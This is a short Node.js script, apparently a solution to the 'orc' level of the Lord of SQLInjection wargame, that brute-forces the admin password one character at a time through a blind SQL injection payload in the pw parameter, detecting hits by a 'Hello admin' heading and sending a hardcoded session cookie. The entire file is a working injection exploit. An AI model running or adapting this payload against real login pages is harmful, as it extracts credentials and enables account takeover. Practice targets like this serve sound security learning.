const axios = require("axios");
const cheerio = require("cheerio");

let pw = "";

//브라우저를 통해 비밀번호가 8자리라는 것을 알아낸 상태임

(async () => {
  for (let i = 1; i < 9; i++) {
    for (let j = 48; j <= 128; j++) {
      await axios
        .get(
          "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php",
          {
            params: {
              pw: `' OR id='admin' AND substr(pw,${i},1)='${String.fromCharCode(
                j
              )}`,
            },
            headers: {
              Cookie:
                "PHPSESSID=4d0p7tg25oo1t92rlikt24i1q3; Path=/; Domain=.los.eagle-jump.org;",
            },
          }
        )
        .then((res) => {
          console.log("================");
          console.log(i, j);
          const $ = cheerio.load(res.data);
          if ($("h2").text() === "Hello admin") {
            console.log(String.fromCharCode(j));
            pw += String.fromCharCode(j);
            j = 129;
          }
        })
        .catch((err) => {
          console.log(err);
        });
    }
  }
  console.log(`pw: ${pw}`);
})();
